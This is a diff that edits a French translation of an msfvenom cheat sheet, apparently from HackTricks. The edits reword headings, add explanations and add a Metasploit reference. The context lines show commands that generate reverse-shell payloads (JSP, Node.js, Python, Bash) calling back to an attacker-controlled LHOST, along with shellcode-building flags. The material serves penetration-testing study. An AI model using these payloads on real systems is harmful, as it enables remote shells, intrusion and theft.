@@ -1,21 +1,21 @@
-# MSFVenom - Aide-mémoire
-
-{{#include ../../banners/hacktricks-training.md}}
+# MSFVenom - CheatSheet
 
 ---
 
-## msfvenom de base
+## msfvenom basique
 
 `msfvenom -p <PAYLOAD> -e <ENCODER> -f <FORMAT> -i <ENCODE COUNT> LHOST=<IP>`
 
-On peut également utiliser `-a` pour spécifier l'architecture ou `--platform`.
+Utilisez `-a` pour sélectionner l'architecture du payload et `--platform` pour sélectionner sa plateforme cible.<sup>[[1]](#references)</sup>
 
 ## Liste
 ```bash
 msfvenom -l payloads #Payloads
 msfvenom -l encoders #Encoders
 ```
-## Paramètres courants lors de la création d'un shellcode
+Ces commandes répertorient les modules de payload et d’encoder disponibles dans le framework installé.<sup>[[1]](#references)</sup>
+
+## Paramètres courants lors de la création d’un shellcode
 ```bash
 -b "\x00\x0a\x0d"
 -f c
@@ -23,6 +23,8 @@ msfvenom -l encoders #Encoders
 EXITFUNC=thread
 PrependSetuid=True #Use this to create a shellcode that will execute something with SUID
 ```
+Les flags présentés ici sélectionnent les bad characters, le format de sortie, l’encoder et le nombre d’itérations d’encodage.<sup>[[1]](#references)</sup>
+
 ## **Windows**
 
 ### **Reverse Shell**
@@ -111,7 +113,7 @@ msfvenom -p java/jsp_shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port) -f w
 ```bash
 msfvenom -p nodejs/shell_reverse_tcp LHOST=(IP Address) LPORT=(Your Port)
 ```
-## **Payloads en langages de script**
+## **Payloads en langage de script**
 
 ### **Perl**
 ```bash
@@ -125,4 +127,7 @@ msfvenom -p cmd/unix/reverse_python LHOST=(IP Address) LPORT=(Your Port) -f raw 
 ```bash
 msfvenom -p cmd/unix/reverse_bash LHOST=<Local IP Address> LPORT=<Local Port> -f raw > shell.sh
 ```
+## References
+
+- [1] [Comment utiliser msfvenom](https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom/eb69bce6cf0d2ba0e876c57b87793bf31c915bb7)
 {{#include ../../banners/hacktricks-training.md}}
